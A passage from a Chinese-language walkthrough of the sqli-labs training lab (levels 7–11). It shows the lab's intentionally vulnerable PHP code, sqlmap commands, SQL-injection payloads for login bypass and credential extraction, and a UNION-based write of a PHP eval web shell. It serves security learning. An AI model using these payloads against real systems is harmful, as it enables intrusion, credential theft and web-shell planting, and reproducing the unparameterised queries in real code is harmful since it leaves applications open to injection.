  	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;
  	}
	<span class="hljs-keyword">else</span> 
	{
	
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font size="3"  color= "#FFFF00"&gt;'</span>;
	<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;&lt;/font&gt;"</span>;	
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;	
	
	}
}</code></pre>
<p>与Less-5类似，只是更换闭合方式为双引号了</p>
<h2 id="less-7">Less-7</h2>
<p>关键代码如下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//including the Mysql connect parameters.</span>
<span class="hljs-keyword">include</span>(<span class="hljs-string">"../sql-connections/sql-connect.php"</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-comment">// take the variables</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>]))
{
<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>];
<span class="hljs-variable">$sql</span>=<span class="hljs-string">"SELECT * FROM users WHERE id=(('<span class="hljs-subst">$id</span>')) LIMIT 0,1"</span>;
<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);
<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);

	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)
	{
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font color= "#FFFF00"&gt;'</span>;	
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">'You are in.... Use outfile......'</span>;
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;
  	}
	<span class="hljs-keyword">else</span> 
	{
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font color= "#FFFF00"&gt;'</span>;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'You have an error in your SQL syntax'</span>;
	<span class="hljs-comment">//print_r(mysql_error());</span>
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;  
	}
}</code></pre>
<p>这里又进行了变动，首先是闭合方式改为了单引号+双括号方式，其次将<code>mysql_error()</code>注释掉了。这意味着我们不能进行联合注入与报错注入，只能进行时间和布尔盲注。可以手工验证后，直接sqlmap跑</p>
<h3 id="盲注">盲注</h3>
<p>布尔盲注</p>
<pre><code class="hljs sql">python3 sqlmap.py <span class="hljs-operator">-</span>u "http://127.0.0.1/sqllabs/Less-7/?id=1" <span class="hljs-comment">--dbms=MySQL --random-agent --flush-session --technique=B -v3</span></code></pre>
<p><code>Payload: id=1') AND 8283=8283 AND ('xwjv'='xwjv</code></p>
<p>时间盲注</p>
<pre><code class="hljs sql">python3 sqlmap.py <span class="hljs-operator">-</span>u "http://127.0.0.1/sqllabs/Less-7/?id=1" <span class="hljs-comment">--dbms=MySQL --random-agent --flush-session --technique=T -v3</span></code></pre>
<p><code>Payload: id=1') AND (SELECT 3626 FROM (SELECT(SLEEP(5)))Nmqc) AND ('PMsB'='PMsB</code></p>
<h3 id="导出数据到文件">导出数据到文件</h3>
<p><code>echo 'You are in.... Use outfile......';</code></p>
<p>根据上述作者的提示，我们尝试将数据库数据导入到文件进行读取</p>
<p>在此之前我们先看一下数据库环境变量：</p>
<pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">'%secure%'</span>;
<span class="hljs-operator">+</span><span class="hljs-comment">--------------------------+-------+</span>
<span class="hljs-operator">|</span> Variable_name            <span class="hljs-operator">|</span> <span class="hljs-keyword">Value</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">--------------------------+-------+</span>
<span class="hljs-operator">|</span> require_secure_transport <span class="hljs-operator">|</span> OFF   <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> secure_auth              <span class="hljs-operator">|</span> <span class="hljs-keyword">ON</span>    <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> secure_file_priv         <span class="hljs-operator">|</span>       <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">--------------------------+-------+</span>
<span class="hljs-number">3</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.04</span> sec)</code></pre>
<ul>
<li>ure_file_priv 的值为 <code>null</code> ，表示限制 mysqld 不允许导入 | 导出</li>
<li>当 secure_file_priv 的值为 <code>/tmp/</code> ，表示限制 mysqld 的导入 | 导出只能发生在 /tmp/ 目录下</li>
<li>当 secure_file_priv 的值为 <code>空</code> 时，表示不对 mysqld 的导入 | 导出做限制</li>
</ul>
<p>可见我们这里是空的，因此可以进行导入导出</p>
<pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">')) union select * from security.users into outfile '</span>D:\\labwork\\phpstudy_pro\\WWW\\sqllabs\\Less<span class="hljs-number">-7</span>\\users.txt<span class="hljs-string">'--+</span></code></pre>
<p>这里我们可以指定导出路径，当然我这里是Windows下，如果在linux下不指定路径，则默认mysql的导出路径为：</p>
<p><code>/var/lib/mysql/security</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202105158611.png" alt="image-20240202105158611"></p>
<p>这里也可以看到导出成功</p>
<p>但一般这种情况下，如果我们可以向Web目录写文件的时候，通常是直接写shell</p>
<pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">')) union select 1,2,"&lt;?php @eval($_POST['</span>hybcx<span class="hljs-string">']);?&gt;" into outfile '</span>D:\\labwork\\phpstudy_pro\\WWW\\sqllabs\\Less-<span class="hljs-number">7</span>\\shell.php<span class="hljs-string">'--+</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202105552266.png" alt="image-20240202105552266"></p>
<p>可以看到写入成功</p>
<h2 id="less-8">Less-8</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//including the Mysql connect parameters.</span>
<span class="hljs-keyword">include</span>(<span class="hljs-string">"../sql-connections/sql-connect.php"</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-comment">// take the variables</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>]))
{
<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>];
<span class="hljs-variable">$sql</span>=<span class="hljs-string">"SELECT * FROM users WHERE id='<span class="hljs-subst">$id</span>' LIMIT 0,1"</span>;
<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);
<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);

	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)
	{
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;	
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">'You are in...........'</span>;
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
    	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;
  	}
	<span class="hljs-keyword">else</span> 
	{
	
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;
	<span class="hljs-comment">//echo 'You are in...........';</span>
	<span class="hljs-comment">//print_r(mysql_error());</span>
	<span class="hljs-comment">//echo "You have an error in your SQL syntax";</span>
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;&lt;/font&gt;"</span>;	
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;	
	
	}
}</code></pre>
<p>与Less-7类似，只不过闭合方式改为了单引号闭合。</p>
<h2 id="less-9">Less-9</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//including the Mysql connect parameters.</span>
<span class="hljs-keyword">include</span>(<span class="hljs-string">"../sql-connections/sql-connect.php"</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);

<span class="hljs-comment">// take the variables</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>]))
{
<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>];
<span class="hljs-variable">$sql</span>=<span class="hljs-string">"SELECT * FROM users WHERE id='<span class="hljs-subst">$id</span>' LIMIT 0,1"</span>;
<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);
<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);

	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)
	{
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;	
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">'You are in...........'</span>;
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
    	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;
  	}
	<span class="hljs-keyword">else</span> 
	{
	
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'You are in...........'</span>;
	<span class="hljs-comment">//print_r(mysql_error());</span>
	<span class="hljs-comment">//echo "You have an error in your SQL syntax";</span>
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;&lt;/font&gt;"</span>;	
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;	
	
	}
}</code></pre>
<p>这一关也进行了较为明显的改动，那就是无论执行SQL语句之后，是否成功，页面回显情况都一致。这意味着我们只能进行时间盲注。</p>
<h2 id="less-10">Less-10</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//including the Mysql connect parameters.</span>
<span class="hljs-keyword">include</span>(<span class="hljs-string">"../sql-connections/sql-connect.php"</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-comment">// take the variables</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>]))
{
<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>];
<span class="hljs-variable">$id</span> = <span class="hljs-string">'"'</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">'"'</span>;
<span class="hljs-variable">$sql</span>=<span class="hljs-string">"SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span> LIMIT 0,1"</span>;
<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);
<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);

	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)
	{
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;	
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">'You are in...........'</span>;
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
    	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;
  	}
	<span class="hljs-keyword">else</span> 
	{
	
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'You are in...........'</span>;
	<span class="hljs-comment">//print_r(mysql_error());</span>
	<span class="hljs-comment">//echo "You have an error in your SQL syntax";</span>
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;&lt;/font&gt;"</span>;	
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;	
	
	}
}</code></pre>
<p>与Less-9类似，但参数id闭合方式改为了双引号</p>
<h2 id="less-11">Less-11</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//including the Mysql connect parameters.</span>
<span class="hljs-keyword">include</span>(<span class="hljs-string">"../sql-connections/sql-connect.php"</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);

<span class="hljs-comment">// take the variables</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'uname'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'passwd'</span>]))
{
	<span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'uname'</span>];
	<span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'passwd'</span>];

	<span class="hljs-comment">//logging the connection parameters to a file for analysis.</span>
	<span class="hljs-variable">$fp</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">'result.txt'</span>,<span class="hljs-string">'a'</span>);
	<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">'User Name:'</span>.<span class="hljs-variable">$uname</span>);
	<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">'Password:'</span>.<span class="hljs-variable">$passwd</span>.<span class="hljs-string">"\n"</span>);
	<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);
	<span class="hljs-comment">// connectivity </span>
	@<span class="hljs-variable">$sql</span>=<span class="hljs-string">"SELECT username, password FROM users WHERE username='<span class="hljs-subst">$uname</span>' and password='<span class="hljs-subst">$passwd</span>' LIMIT 0,1"</span>;
	<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);
	<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);

	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)
	{
  		<span class="hljs-comment">//echo '&lt;font color= "#0000ff"&gt;';	</span>
  		
  		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;
		<span class="hljs-comment">//echo " You Have successfully logged in\n\n " ;</span>
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font size="3" color="#0000ff"&gt;'</span>;	
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'Your Login name:'</span>. <span class="hljs-variable">$row</span>[<span class="hljs-string">'username'</span>];
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'Your Password:'</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">'password'</span>];
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src="../images/flag.jpg"  /&gt;'</span>;	
		
  		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;
  	}
	<span class="hljs-keyword">else</span>  
	{
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;
		<span class="hljs-comment">//echo "Try again looser";</span>
		<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src="../images/slap.jpg" /&gt;'</span>;	
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;  
	}
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这一关整体框架如同Less-1一般，只不过注入点发生在了form表单处，也就是post型注入。</p>
<p>看代码可以发现，这里对usernam与password参数没有进行任何检查。</p>
<h3 id="万能密码">万能密码</h3>
<p>一般这种表单处，最简单的漏洞就是万能密码的利用了，而这里也是存在的。</p>
<pre><code class="hljs sql">uname<span class="hljs-operator">=</span>admin<span class="hljs-string">' or '</span><span class="hljs-number">1</span><span class="hljs-string">'='</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span>asd<span class="hljs-operator">&amp;</span>submit<span class="hljs-operator">=</span>Submit</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202110918831.png" alt="image-20240202110918831"></p>
<p>可以看到成功进入，且不需要输入正确的密码。其余类似构造如下：</p>
<pre><code class="hljs sql"># 注释掉 passwd 来登录
uname<span class="hljs-operator">=</span>admin<span class="hljs-string">'--+&amp;passwd=&amp;submit=Submit</span>
<span class="hljs-string">uname=admin'</span>#<span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span><span class="hljs-operator">&amp;</span>submit<span class="hljs-operator">=</span>Submit

# 注释后面语句 并 添加一个永真条件
uname<span class="hljs-operator">=</span>admin<span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">' or 1--+&amp;submit=Submit</span>
<span class="hljs-string">uname=admin&amp;passwd=1'</span><span class="hljs-operator">||</span><span class="hljs-number">1</span><span class="hljs-comment">--+&amp;submit=Submit</span>
uname<span class="hljs-operator">=</span>admin<span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">' or 1#&amp;submit=Submit</span>
<span class="hljs-string">uname=admin&amp;passwd=1'</span><span class="hljs-operator">||</span><span class="hljs-number">1</span>#<span class="hljs-operator">&amp;</span>submit<span class="hljs-operator">=</span>Submit

# 闭合后面语句 并 添加一个永真条件
uname<span class="hljs-operator">=</span>admin<span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">'or'</span><span class="hljs-number">1</span><span class="hljs-string">'='</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>submit<span class="hljs-operator">=</span>Submit
uname<span class="hljs-operator">=</span>admin<span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">'||'</span><span class="hljs-number">1</span><span class="hljs-string">'='</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>submit<span class="hljs-operator">=</span>Submit</code></pre>
<h3 id="联合注入">联合注入</h3>
<pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">'union select 1,(select group_concat(username,0x7e,password)from users)#&amp;passwd=hybcx&amp;submit=Submit</span></code></pre>
<h3 id="报错注入">报错注入</h3>
<pre><code class="hljs sql">uname<span class="hljs-operator">=</span>hybcx<span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">'and (select 1 from(select count(*),concat(floor(rand(0)*2),(select concat(username,0x7e,password)from users limit 0,1))a from information_schema.tables group by a)b)-- mOVv&amp;submit=Submit   --错误例子</span>
<span class="hljs-string"></span>
<span class="hljs-string">uname=hybcx&amp;passwd=1'</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> concat(username,<span class="hljs-number">0x7e</span>,password)<span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>)#<span class="hljs-operator">&amp;</span>submit<span class="hljs-operator">=</span>Submit  <span class="hljs-comment">--正确例子</span>

uname<span class="hljs-operator">=</span>hybcx<span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">' union select count(*),concat((select user()),floor(rand(0)*2))x from information_schema.columns group by x#&amp;submit=Submit  --正确例子</span></code></pre>
<p>这里本想着继续尝试floor的报错方式，但这里似乎并不支持，找了诸多文章，发现大概是select 1 from中的数字1问题，这里的数据库似乎不支持这种方式，select 1的意思是指定某一列：</p>
<pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> users;
<span class="hljs-operator">+</span><span class="hljs-comment">---+</span>
<span class="hljs-operator">|</span> <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">---+</span>
<span class="hljs-operator">|</span> <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">---+</span>
<span class="hljs-number">13</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.03</span> sec)</code></pre>
<p>而这里如果不添加select 1 的语句，则会成功报错</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202121942796.png" alt="image-20240202121942796"></p>
<h3 id="布尔盲注">布尔盲注</h3>
<pre><code class="hljs sql">uname<span class="hljs-operator">=</span>admin<span class="hljs-string">' and left(database(),1)&gt;'</span>r<span class="hljs-string">'#&amp;passwd=&amp;submit=Submit</span>
<span class="hljs-string">uname=admin'</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">left</span>(database(),<span class="hljs-number">1</span>)<span class="hljs-operator">&gt;</span><span class="hljs-string">'s'</span>#<span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span><span class="hljs-operator">&amp;</span>submit<span class="hljs-operator">=</span>Submit</code></pre>
<h3 id="时间盲注">时间盲注</h3>
<pre><code class="hljs sql">uname<span class="hljs-operator">=</span>admin<span class="hljs-string">' and if(ascii(substr(database(),1,1))&gt;114,1,sleep(4))#&amp;passwd=&amp;submit=Submit</span>
<span class="hljs-string">uname=admin'</span> <span class="hljs-keyword">and</span> if(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">115</span>,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">4</span>))#<span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span><span class="hljs-operator">&amp;</span>submit<span class="hljs-operator">=</span>Submit</code></pre>
<h3 id="sqlmap">sqlmap</h3>
<p>直接拿出bp抓到的数据，保存为txt即可</p>
<pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/sqllabs/Less-11/</span> <span class="hljs-meta">HTTP/1.1</span>
<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1
<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br
<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded
<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>88
<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1
<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
<span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/sqllabs/Less-11/
<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1
<span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document
<span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate
<span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin
<span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1

<span class="language-bash"><span class="hljs-built_in">uname</span>=<span class="hljs-built_in">test</span>&amp;passwd=123&amp;submit=Submit</span></code></pre>
<p>然后直接使用 sqlmap 的 -r 参数来加载这个请求包：</p>
<pre><code class="hljs py">python3 sqlmap.py -r res.txt</code></pre>
<p>也可以手动通过 <code>--data</code> 来对 POST 的数据包内容进行注入检测：</p>
<pre><code class="hljs plaintext">sqlmap -u "http://127.0.0.1/sqllab/Less-11/" --data="uname=admin&amp;passwd=2333&amp;submit=Submit"</code></pre>
<p>实际上 <code>--data</code> 比较鸡肋，操作效率比较低。</p>
<p>联合注入</p>
<pre><code class="hljs sql">python3 sqlmap.py <span class="hljs-operator">-</span>r res.txt <span class="hljs-operator">-</span>p "uname" <span class="hljs-comment">--dbms=MySQl --random-agent --flush-session --technique=U -v3</span></code></pre>
<p>报错注入</p>
<pre><code class="hljs sql">python3 sqlmap.py <span class="hljs-operator">-</span>r res.txt <span class="hljs-operator">-</span>p "uname" <span class="hljs-comment">--dbms=MySQl --random-agent --flush-session --technique=E -v3</span></code></pre>
<p>布尔盲注</p>
<pre><code class="hljs sql">python3 sqlmap.py <span class="hljs-operator">-</span>r res.txt <span class="hljs-operator">-</span>p "uname" <span class="hljs-comment">--dbms=MySQl --random-agent --flush-session --technique=B -v3</span></code></pre>
<p>时间盲注</p>
<pre><code class="hljs sql">python3 sqlmap.py <span class="hljs-operator">-</span>r res.txt <span class="hljs-operator">-</span>p "uname" <span class="hljs-comment">--dbms=MySQl --random-agent --flush-session --technique=T -v3</span></code></pre>
<h2 id="less-12">Less-12</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//including the Mysql connect parameters.</span>
<span class="hljs-keyword">include</span>(<span class="hljs-string">"../sql-connections/sql-connect.php"</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);

<span class="hljs-comment">// take the variables</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'uname'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'passwd'</span>]))
{
	<span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'uname'</span>];
